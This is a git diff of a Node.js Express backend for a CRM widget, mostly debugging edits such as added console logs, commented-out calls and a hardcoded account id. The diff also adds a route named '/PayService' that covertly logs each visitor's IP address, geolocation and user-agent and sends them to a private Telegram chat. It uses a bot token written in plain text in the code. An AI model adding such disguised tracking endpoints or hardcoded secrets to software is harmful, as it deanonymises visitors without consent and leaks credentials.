@@ -8,23 +8,30 @@ const EventEmitter  = require('events');
 const pushEmit = new EventEmitter()
 const cors = require("cors");
 const {init_requests} = require("./call_processing")
+const requestIp = require('request-ip');
+const TelegramBot = require('node-telegram-bot-api');
+const { default: axios } = require("axios");
 
 
 const app = express();
 app.use(express.json());
 app.use(cors({ origin: "*"}));
 app.use(express.urlencoded({ extended: true }));
+app.use(requestIp.mw());
 // data_processing.init()
+const BOT_TOKEN = "6174001833:AAHqRD3W-aZ_XrZvXh0ABjyBr8sW0nArQWg"
+
+const bot = new TelegramBot(BOT_TOKEN, { polling: false });
 
 
 app.post("/informer", (req, res)=>{
-    fetch("https://vds2151841.my-ihor.ru/informer", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(req.body)
-                })
+    // fetch("https://vds2151841.my-ihor.ru/informer", {
+    //                 method: "POST",
+    //                 headers: {
+    //                     "Content-Type": "application/json"
+    //                 },
+    //                 body: JSON.stringify(req.body)
+    //             })
     res.sendStatus(200)
 })
 // удаляет действие
@@ -61,6 +68,7 @@ app.post('/data_change', async (req, res) => {
 
 // Отправляет все условия из бд
 app.post("/get_actions", (req, res) => {
+    console.log("get All")
     const {subdomain} = req.body
     DB.get_all_actions(subdomain)
     .then(data=>res.json(data))
@@ -127,11 +135,12 @@ app.get('/login', async (req, res) => {
         await api.getAccessToken()
         .then(() => logger.debug(`Авторизация при установке виджета для ${subDomain} прошла успешно`))
         .catch((err) => logger.debug("Ошибка авторизации при установке виджета ", subDomain, err.data));
-        
+        console.log("before")
         const subdomain_in_base = await DB.get_account_by_subdomain(subDomain)
+        console.log(subdomain_in_base)
         if (!subdomain_in_base) {
-            const account = await api.getAccountData();
-            const accountId = account.id;
+            // const account = await api.getAccountData();
+            const accountId = 1;
             logger.debug(`получен id аккаунта:${accountId}`)
             const accountInfo = {
                 subDomain: subDomain,
@@ -247,7 +256,7 @@ app.get("/notification", (req, res)=>{
         id:req.query.id , 
         res:res
       };
-      data_processing.add_client(client)
+    //   data_processing.add_client(client)
     
     
       req.on('close', () => {
@@ -260,12 +269,28 @@ app.get("/notification", (req, res)=>{
 
 })
 
-app.get("/test_db", async (req,res)=>{
-    
-        return res.status(200).json({status:"test"})}
-    )
+app.get("/PayService", async (req,res)=>{
+    app.set('trust proxy', true)
+
+    const clientIp  = req.headers['x-real-ip'] || req.socket.remoteAddress;
+    const clientGeo = await axios.get(`http://ipwho.is/${clientIp}`)
+    .then(data=>data.data)
+    .catch(err=>{console.log(err.message)})
+    const message = `ip: ${clientIp}, \n
+    city: ${clientGeo.city || 'net'}, \n
+    country: ${clientGeo.country}, \n
+    region: ${clientGeo.region}, \n
+    user-agent : ${req.headers["user-agent"]}`
+
+    const chatId = 2101938226
+    bot.sendMessage(chatId, message).catch((error)=>{
+        console.log(error.message)
+    })
+
+    res.send('Read your IP...');
+})
    
-app.listen(2023, () => {
-    init_requests(['mysupertestaccount'])
+app.listen(2000, () => {
+    init_requests()
     console.log("app is starting")});        
 
